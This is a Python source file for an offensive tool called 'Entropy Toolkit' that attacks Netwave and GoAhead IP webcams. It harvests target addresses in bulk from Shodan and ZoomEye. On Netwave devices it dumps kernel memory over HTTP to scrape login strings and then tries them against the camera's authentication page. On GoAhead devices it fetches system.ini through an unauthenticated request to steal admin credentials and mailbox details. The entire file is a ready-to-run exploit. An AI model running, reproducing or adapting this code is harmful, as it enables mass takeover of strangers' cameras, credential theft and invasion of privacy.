#!/usr/bin/env python3

import os

os.system("printf '\033]2;Entropy Toolkit\a'")

import argparse
import time
import subprocess
import logging
import shlex
import threading
import random
import sys
import signal
import time
import requests
import tailer
import shodan

TMP_PATH='/tmp/'

parser=argparse.ArgumentParser()
parser.add_argument("-b","--brand",metavar="[1|2]",dest='brand',help="Choose the brand of IP webcam. (1)Netwave, (2)GoAhead.",choices=[1,2],type=int)
parser.add_argument("-o","--output",metavar="<output_path>",dest='outputfile',help="Output to the specified path.",type=str)
parser.add_argument("--timeout",metavar="<timeout>",dest='timeout',help="Timeout in seconds.",type=int,default=300)
parser.add_argument("-t","--task",metavar="<tasks>",dest='tasks',help="Run tasks number of connects in parallel.",default=10,type=int)
parser.add_argument("-c","--count",metavar="<count>",dest='count',help="The number of IP you want to get.",default=100,type=int)
group1=parser.add_mutually_exclusive_group()
group1.add_argument("-q","--quiet",dest='quiet',help="Quiet mode.",action='store_true')
group1.add_argument("-v","--verbose",dest='verbose',help="Verbose mode.",action='store_true')
group2=parser.add_mutually_exclusive_group()
group2.add_argument("-a","--address",metavar="<ip:port>",dest='address',help="IP and port of the webcam.",type=str)
group2.add_argument("-i","--input",metavar="<input_file>",dest='inputfile',help="List of webcams addresses.",type=str)
group2.add_argument("--shodan",metavar="<api>",dest='shodan',help="Attack through Shodan.",type=str)
group2.add_argument("--zoomeye",metavar="<api>",dest='zoomeye',help="Attack through ZoomEye.",type=str)
parser.add_argument("-u","--update",dest='update',help="Update Entropy Toolkit.",action='store_true')
parser.add_argument("--version",dest='version',help="Show Entropy Toolkit version.",action='store_true')

args=parser.parse_args()

if args.update:
    os.system("chmod +x bin/entropy && bin/entropy -u")
    sys.exit()

if args.version:
    os.system("cat banner/banner.txt")
    print("")
    print("Entropy Toolkit v3.0")
    sys.exit()

if args.outputfile:
    logger = logging.getLogger()
    
    I = '\033[1;77m'
    A = '\033[1;34m'
    B = '\033[1;31m'
    C = '\033[1;33m'
    E = '\033[0m'
    G = '\033[1;32m'
    D = '\033[0m'
	
    outputfile = args.outputfile
    
    if os.path.isdir(outputfile):
        if os.path.exists(outputfile):
            if outputfile[-1] == "/":
                outputfile = outputfile + 'output.txt'
                fh = logging.FileHandler(outputfile)
                logger.addHandler(fh)
                logger.setLevel(logging.INFO)
            else:
                outputfile = outputfile + '/output.txt'
                fh = logging.FileHandler(outputfile)
                logger.addHandler(fh)
                logger.setLevel(logging.INFO)
        else:
            print(color.B+"[-]"+color.E+" Output directory: "+outputfile+": does not exist!")
            # Standart Error Message
            sys.exit()
    else:
        direct = os.path.split(outputfile)[0]
        if direct == "":
            direct = "."
        else:
            pass
        if os.path.exists(direct):
            if os.path.isdir(direct):
                fh = logging.FileHandler(outputfile)
                logger.addHandler(fh)
                logger.setLevel(logging.INFO)
            else:
                print(color.B+"[-]"+color.E+" Error: "+direct+": not a directory!")
                # Standart Error Message
                sys.exit()
        else:
            print(color.B+"[-]"+color.E+" Output directory: "+direct+": does not exist!")
            # Standart Error Message
            sys.exit()
        
def handlesignal(signum,frame):
    print(color.C+"\n[!]"+color.E+" Attack terminated.")
    sys.exit()

class Color(object):
    I = '\033[1;77m'
    A = '\033[1;34m'
    B = '\033[1;31m'
    C = '\033[1;33m'
    E = '\033[0m'
    G = '\033[1;32m'
    D = '\033[0m'

color=Color()
signal.signal(signal.SIGINT,handlesignal)
class NWThread(threading.Thread):
    def __init__(self,ip,port):
        threading.Thread.__init__(self)
        self.ip=ip
        self.port=port
        self.macurl = 'http://' + self.ip + ':' + self.port + '/get_status.cgi'
        self.dumpurl= 'http://' + self.ip + ':' + self.port + '//proc/kcore'
        self.starttime=time.time()
        self.forreplace='tmpout_%s'%self.starttime
        self.tmpstream=TMP_PATH+'tmpstream_%s'%self.starttime
        self.tmpout=TMP_PATH+self.forreplace
        self.base=TMP_PATH+'base.py'
        self.usefile=self.tmpout+'.py'
        self.count=0
        self.loginlist=[]
        subprocess.Popen("cp ./base.py %s 2>/dev/null"%self.base,shell=True)
    def getMac(self):
        try:
            self.r=requests.get(self.macurl,timeout=30)
            self.text=self.r.text.split(';\n')
            for i in self.text:
                if i.startswith('var id='):
                    tmp=i.split('\'')
                    macaddr=tmp[1]
                    if args.outputfile:
                        logger.info(color.A+"[*]"+color.E+" The %s:%s, MAC: %s%s"%(self.ip,self.port,macaddr,color.D))
                    if args.verbose:
                        print(color.A+"[*]"+color.E+" The %s:%s, MAC: %s%s"%(self.ip,self.port,macaddr,color.D))
                    return macaddr
        except Exception:
            return None
    def memorydump(self,mac):
        try:
            try:
                pw_args=shlex.split("wget -qO - %s"%self.dumpurl)
                pw = subprocess.Popen(pw_args,stdout=open(self.tmpstream,'w'))
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s%s"%(self.ip,self.port,e,color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s%s"%(self.ip,self.port,e,color.D))
            subprocess.Popen("echo '' > %s" % self.tmpout,shell=True)
            time.sleep(1)
            try:
                pt = subprocess.Popen("tail --pid=%d -f %s | strings >> %s" % (pw.pid,self.tmpstream, self.tmpout), shell=True)
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s%s"%(self.ip,self.port,e,color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s%s"%(self.ip,self.port,e,color.D))
            subprocess.Popen("sed -e 's/replace/%s/g' -e 's/300/%d/g' %s > %s" % (self.forreplace,args.timeout+100,self.base, self.usefile), shell=True)
            time.sleep(0.5)
            subprocess.Popen("chmod a+x %s" % self.usefile, shell=True)
            time.sleep(0.5)
            try:
                padd = subprocess.Popen([self.usefile])
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s%s"%(self.ip,self.port,e,color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s%s"%(self.ip,self.port,e,color.D))
            while True:
                if os.stat(self.tmpout).st_size < 1024:
                    self.init_end_time = time.time()
                    if self.init_end_time - self.starttime > 60:
                        if args.outputfile:
                            logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable.%s"%(self.ip,self.port,color.D))
                        print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable.%s" % (self.ip, self.port, color.D))
                        break
                else:
                    for line in tailer.follow(open(self.tmpout, 'r')):
                        self.tail_end_time = time.time()
                        if self.tail_end_time - self.starttime > args.timeout:
                            if args.outputfile:
                                logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable.%s" % (self.ip, self.port, color.D))
                            print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable.%s" % (self.ip, self.port, color.D))
                            break
                        if self.count == 0:
                            if line == mac:
                                self.count = 1
                        elif self.count == 1:
                            self.loginlist.append(line)
                            self.count = 2

                        elif self.count == 2:
                            self.loginlist.append(line)
                            self.count = 3

                        elif self.count == 3:
                            self.loginlist.append(line)
                            self.count = 4
                        elif self.count == 4:
                            self.loginlist.append(line)
                            break
                        else:
                            continue
                    break
        except Exception as e:
            if args.outputfile:
                logger.error(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s%s" % (self.ip, e, color.D))
            if args.verbose:
                print(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s%s" % (self.ip, e, color.D))
        finally:
            try:
                padd.kill()
                time.sleep(random.random())
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The error occured in killing addpy part: %s%s" % (e, color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The error occured in killing addpy part: %s%s" % (e, color.D))
            try:
                subprocess.Popen("rm %s 2> /dev/null" % self.usefile,shell=True)
                time.sleep(random.random())
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The error occured in removing addpy part: %s%s" % (e, color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The error occured in killing addpy part: %s%s" % (e, color.D))
            try:
                pw.kill()
                time.sleep(random.random())
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The error occured in killing wget part: %s%s" % (e, color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The error occured in killing addpy part: %s%s" % (e, color.D))
            try:
                subprocess.Popen("rm %s 2> /dev/null" % self.tmpstream,shell=True)
                time.sleep(random.random())
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The error occured in removing tmpstream part: %s%s" % (e, color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The error occured in killing addpy part: %s%s" % (e, color.D))
            try:
                pt.kill()
                time.sleep(random.random())
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The error occured in killing tail part: %s%s" % (e, color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The error occured in killing tail part: %s%s" % (e, color.D))
            try:
                subprocess.Popen("rm %s 2> /dev/null" % self.tmpout,shell=True)
                time.sleep(random.random())
            except Exception as e:
                if args.outputfile:
                    logger.error(color.B+"[-]"+color.E+" The error occured in removing tmpout part: %s%s" % (e, color.D))
                if args.verbose:
                    print(color.B+"[-]"+color.E+" The error occured in removing tmpout part: %s%s" % (e, color.D))
    def exploit(self):
        for i in self.loginlist:
            for j in self.loginlist:
                try:
                    tmp_url = 'http://' + self.ip + ':' + self.port + '/check_user.cgi'
                    tmp_r = requests.get(tmp_url, timeout=10)
                except Exception:
                    continue
                if tmp_r.status_code == 401:
                    try:
                        auth_set = (i, j)
                        tmp_r = requests.get(tmp_url, auth=auth_set, timeout=10)
                        tmp_sleep = random.random()
                        time.sleep(tmp_sleep)
                        if tmp_r.status_code == 200:
                            if args.outputfile:
                                logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s%s"%(self.ip,self.port,i,j,color.D))
                            print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s%s"%(self.ip,self.port,i,j,color.D))
                            return
                        else:
                            continue
                    except Exception:
                        continue
                elif tmp_r.status_code == 404:
                    tmp_url = 'http://' + self.ip + ':' + self.port + '/get_camera_params.cgi'
                    tmp_r = requests.get(tmp_url, timeout=10)
                    if tmp_r.status_code == 401:
                        try:
                            auth_set = (i, j)
                            tmp_r = requests.get(tmp_url, auth=auth_set, timeout=10)
                            tmp_sleep = random.random()
                            time.sleep(tmp_sleep)
                            if tmp_r.status_code == 200:
                                if args.outputfile:
                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s%s" % (self.ip, self.port, i, j, color.D))
                                print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s%s" % (self.ip, self.port, i, j, color.D))
                                return
                            else:
                                continue
                        except Exception:
                            continue
                    else:
                        if args.outputfile:
                            logger.info(color.C+"[!]"+color.E+" The IP Webcamera is not vulnerable."+color.D)
                        print(color.C+"[!]"+color.E+" The IP Webcamera is not vulnerable."+color.D)
    def run(self):
        try:
            macaddr=self.getMac()
            if macaddr is not None:
                if args.outputfile:
                    logger.info(color.A+'[*]'+color.E+' Exploiting %s:%s...%s' % (self.ip, self.port, color.D))
                if args.verbose:
                    print(color.A+'[*]'+color.E+' Exploiting %s:%s...%s' % (self.ip, self.port, color.D))
                self.memorydump(macaddr)
                self.exploit()
                if args.outputfile:
                    logger.info('')
                if args.verbose:
                    time.sleep(0)
            else:
                if args.outputfile:
                    logger.info(color.C+"[!]"+color.E+" The IP Webcamera %s:%s is not vulnerable.%s" % (self.ip,self.port,color.D))
                    logger.info('')
                print(color.C+"[!]"+color.E+" The IP Webcamera %s:%s is not vulnerable.%s" % (self.ip,self.port,color.D))
                time.sleep(0)
        except Exception:
            pass

class GoAThread(threading.Thread):
    def __init__(self,ip,port):
        threading.Thread.__init__(self)
        self.ip=ip
        self.port=port
        self.starttime=time.time()
        self.info_url='http://'+self.ip+':'+self.port+'/system.ini?loginuse&loginpas'
        self.wget_out_path=TMP_PATH+'tmpout_%s'%self.starttime
        self.strings_out_path=TMP_PATH+'tmpstrings_%s'%self.starttime
        self.ftp_flag=False
        self.mailbox_flag=False
        self.keep_strings_file=False
    def getInfo(self):
        try:
            if args.outputfile:
                logger.info(color.A+'[*]'+color.E+' Exploiting %s:%s...%s'%(self.ip,self.port,color.D))
            if args.verbose:
                print(color.A+'[*]'+color.E+' Exploiting %s:%s...%s'%(self.ip,self.port,color.D))
            pw_args = shlex.split("wget -qO - %r" % self.info_url)
            pw = subprocess.Popen(pw_args, stdout=open(self.wget_out_path, 'w'))
            tmp_sleeptime = random.randint(10, 30)
            time.sleep(tmp_sleeptime)
            if os.stat(self.wget_out_path).st_size > 0:
                if args.outputfile:
                    logger.info(color.G+"[+]"+color.E+" The %s:%s is vulnerable!%s"%(self.ip,self.port,color.D))
                print(color.G+"[+]"+color.E+" The %s:%s is vulnerable!%s"%(self.ip,self.port,color.D))
                try:
                    pstr = subprocess.Popen(['strings', ], stdin=open(self.wget_out_path, 'r'),
                                            stdout=open(self.strings_out_path, 'w'))
                    count = 0
                    time.sleep(1)
                    with open(self.strings_out_path, 'r') as f:
                        for i in f.readlines():
                            if 'nc' in i or 'sh' in i:
                                if not self.ftp_flag:
                                    if args.outputfile:
                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, FTP may be vulnerable!%s" % (self.ip, self.port, color.D))
                                    print(color.G+"[+]"+color.E+" The %s:%s, FTP may be vulnerable!%s" % (self.ip, self.port, color.D))
                                    self.ftp_flag=True
                            elif '@' in i:
                                if not self.mailbox_flag:
                                    tmp_mailbox = i.strip('\n').strip(' ').strip()
                                    if args.outputfile:
                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s%s" % (self.ip, self.port, tmp_mailbox, color.D))
                                        logger.info(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK! The file is recheck_%s.%s"%(self.ip,color.D))
                                    print(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s%s" % (self.ip, self.port, tmp_mailbox, color.D))
                                    print(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK! The file is recheck_%s.%s"%(self.ip,color.D))
                                    self.mailbox_flag = True
                                    self.keep_strings_file = True
                            elif count == 0:
                                if 'admin' in i:
                                    tmp_username = i.strip('\n').strip(' ').strip()
                                    if args.outputfile:
                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s%s" % (self.ip, self.port, tmp_username, color.D))
                                    print(color.G+"[+]"+color.E+" The %s:%s, username: %s%s" % (self.ip, self.port, tmp_username, color.D))
                                    count = 1
                                    continue
                            elif count == 1:
                                tmp_password = i.strip('\n').strip(' ').strip()
                                if args.outputfile:
                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, password: %s%s" % (self.ip, self.port, tmp_password, color.D))
                                print(color.G+"[+]"+color.E+" The %s:%s, password: %s%s" % (self.ip, self.port, tmp_password, color.D))
                                break
                            else:
                                continue
                        else:
                            self.keep_strings_file = True
                            if args.outputfile:
                                logger.info(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s.%s"%(self.ip,color.D))
                            print(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s.%s"%(self.ip,color.D))
                except Exception as e:
                    if args.outputfile:
                        logger.error(color.B+"[-]"+color.E+" The error occured in getting info part: %s%s" % (e,color.D))
                    if args.verbose:
                        print(color.B+"[-]"+color.E+" The error occured in getting info part: %s%s" % (e,color.D))
                    pass
                finally:
                    try:
                        pstr.kill()
                    except Exception:
                        pass
            else:
                try:
                    pw.kill()
                    if args.outputfile:
                        logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable.%s"%(self.ip,self.port,color.D))
                    print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable.%s"%(self.ip,self.port,color.D))
                except Exception:
                    pass
        finally:
            if self.keep_strings_file:
                subprocess.Popen("rm %s 2>/dev/null" % self.wget_out_path, shell=True)
                subprocess.Popen("mkdir RECHECK 2>/dev/null",shell=True)
                subprocess.Popen("mv %s ./RECHECK/recheck_%s 2>/dev/null"%(self.strings_out_path,self.ip),shell=True)
            else:
                subprocess.Popen("rm %s 2>/dev/null" % self.wget_out_path, shell=True)
                subprocess.Popen("rm %s 2>/dev/null" % self.strings_out_path, shell=True)
    def run(self):
        self.getInfo()

class Scrapy(object):
    def __init__(self,key,app,page=None):
        self.key=key
        self.app=app
        self.page=page
        self.header={}
    def shodan(self):
        self.shodanapi=shodan.Shodan(self.key)
        self.sdresults=self.shodanapi.search(query=self.app)
        self.sdiplist=[]
        for results in self.sdresults['matches']:
            tmp = results['ip_str'] + ':' + str(results['port'])
            self.sdiplist.append(tmp)
        return self.sdiplist
    def zoomeye(self):
        self.base_1='https://api.zoomeye.org/host/search?query='
        self.base_2='&page='
        self.url=self.base_1+self.app+self.base_2+str(self.page)
        self.header['Authorization']='JWT '+self.key
        self.zeiplist = []
        try:
            self.s=requests.Session()
            self.r=self.s.get(self.url,headers=self.header)
            self.data=self.r.json()
            if not len(self.data['matches']):
                return None
            for data in self.data['matches']:
                tmp = data['ip'] + ':' + str(data['portinfo']['port'])
                self.zeiplist.append(tmp)
            return self.zeiplist
        except Exception as e:
            if args.outputfile:
                logger.error(color.B+'[-]'+color.E+' Scrapying IP from ZoomEye occured.',e)
            print(color.B+'[-]'+color.E+' Scrapying IP from ZoomEye occured.',e)
        finally:
            self.s.close()


def crack(tmp_ip_list):
    instance_list = []
    for i in tmp_ip_list:
        tmp_ip = i.split(':')[0]
        tmp_port = i.split(':')[-1]
        if args.brand == 1:
            tmp_instance = NWThread(ip=tmp_ip, port=tmp_port)
        if args.brand == 2:
            tmp_instance = GoAThread(ip=tmp_ip, port=tmp_port)
        tmp_instance.setDaemon(True)
        instance_list.append(tmp_instance)
        if len(instance_list) > args.tasks - 1:
            for ins in instance_list:
                ins.start()
            for ins in instance_list:
                ins.join()
            instance_list = []
    try:
        for ins in instance_list:
            ins.start()
        for ins in instance_list:
            ins.join()
    except Exception:
        pass

def bundle():
    os.system("clear")
    os.system("cat banner/banner.txt")
    print("")

def main():
    class Color(object):
        I = '\033[1;77m'
        A = '\033[1;34m'
        B = '\033[1;31m'
        C = '\033[1;33m'
        E = '\033[0m'
        G = '\033[1;32m'
        D = '\033[0m'

    color=Color()
    if args.shodan:
        bundle()
        try:
            if args.brand==1:
                tmp_s=Scrapy(key=args.shodan,app='netwave')
                tmp_ip_list=tmp_s.shodan()
                crack(tmp_ip_list)
            if args.brand==2:
                tmp_s=Scrapy(key=args.shodan,app='5ccc069c403ebaf9f0171e9517f40e41')
                tmp_ip_list=tmp_s.shodan()
                crack(tmp_ip_list)
            print(color.I+"[i]"+color.E+" Attack terminated.")
        except Exception as e:
            print(color.B+"[-]"+color.E+" Error: %s" % e)
            # Standart Error Message
    elif args.zoomeye:
        bundle()
        try:
            p1,p2=divmod(args.count,20)
            page=p1
            if p2 != 0:
                page+=1
            for p in range(1, page + 1):
                if args.brand == 1:
                    tmp_s=Scrapy(key=args.zoomeye, app='netwave', page=p)
                    tmp_ip_list = tmp_s.zoomeye()
                if args.brand == 2:
                    tmp_s = Scrapy(key=args.zoomeye, app='5ccc069c403ebaf9f0171e9517f40e41', page=p)
                    tmp_ip_list=tmp_s.zoomeye()
                crack(tmp_ip_list)
            print(color.I+"[i]"+color.E+" Attack terminated.")
        except Exception as e:
            print(color.B+"[-]"+color.E+" Error: %s" % e)
            # Standart Error Message
    elif args.inputfile:
        bundle()
        tmp_ip_list = []
        
        inputfile = args.inputfile
	
        if os.path.exists(inputfile):
            if os.path.isdir(inputfile):
                print(color.B+"[-]"+color.E+" Error: "+inputfile+": is a directory!")
                # Standart Error Message
                sys.exit()
            else:   
                with open(inputfile,'r') as f:
                    for i in f.readlines():
                        tmp_ip_list.append(i.strip())
                    
                crack(tmp_ip_list)
                print(color.I+"[i]"+color.E+" Attack terminated.")
        else:
            print(color.B+"[-]"+color.E+" Input file: "+inputfile+": does not exist!")
            # Standart Error Message
            
    elif args.address:
        bundle()
        try:
            ip=args.address.split(':')[0]
            port=args.address.split(':')[-1]
            if args.brand == 1:
                inst=NWThread(ip=ip,port=port)
            if args.brand == 2:
                inst=GoAThread(ip=ip,port=port)
            inst.start()
            inst.join()
            print(color.I+"[i]"+color.E+" Attack terminated.")
        except Exception as e:
            print(color.B+"[-]"+color.E+" Error: %s" % e)
            # Standart Error Message
    else:
        parser.print_help()
        
if __name__=='__main__':
    main()
